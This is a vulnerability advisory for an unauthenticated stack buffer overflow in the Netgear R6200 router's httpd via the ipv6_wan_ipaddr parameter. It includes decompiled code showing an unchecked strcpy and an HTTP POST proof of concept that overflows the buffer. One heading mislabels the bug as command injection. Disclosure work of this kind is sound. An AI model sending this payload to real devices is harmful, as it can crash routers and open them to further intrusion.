# Buffer Overflow Vulnerability in `ipv6_wan_ipaddr`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6200 Router                                         |
| Firmware Version     | V1.0.1.58_1.0.44                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`IPv6FixCgiMain` â†’ `IPv6CgiGetParam`) (data flow via `ipv6_wan_ipaddr`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameter `ipv6_wan_ipaddr` |

2. Exploitation Path

```c
int __fastcall IPv6FixCgiMain(char *a1, int a2)
{
  ...
  char v7[256]; // [sp+18h] [-100h] BYREF
  ...
  websGetVar(a1, "ipv6_wan_ipaddr", v7);
  if ( !acosNvramConfig_match("ipv6_wan_ipaddr", v7) )
  {
    acosNvramConfig_set("ipv6_wan_ipaddr", v7);
    v4 = 1;
  }
  ...
}

int __fastcall IPv6CgiGetParam(int a1, const char *a2, char *a3)
{
  ...
  char v25[128]; // [sp+7Eh] [-182h] BYREF
  ...
  memset(v25, 0, sizeof(v25));
  if ( strcmp(a2, "ipv6_auto_type") )
  {
    if ( !strcmp(a2, "ipv6_wan") )
    {
      v8 = (const char *)acosNvramConfig_get("ipv6_wan_ipaddr");
      strcpy(v25, v8);
      ...
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: Within the `httpd` binary, the `IPv6FixCgiMain` function at line 6 invokes `websGetVar(a1, "ipv6_wan_ipaddr", v7)` to receive input. While a 255-byte length limit is enforced at this stage, no further validation is applied. The input is subsequently stored temporarily via `acosNvramConfig_set("ipv6_wan_ipaddr", v7)` at line 9. Later, the `IPv6CgiGetParam` function retrieves this intermediate value at line 25 using `v8 = (const char *)acosNvramConfig_get("ipv6_wan_ipaddr")`. Finally, at line 26, the data is copied into the destination buffer `v25` via `strcpy(v25, v8)`, where `v25` has a size of 128 bytes, leading to a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/IPv6FixCgiMain HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: close

ipv6_wan_ipaddr=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```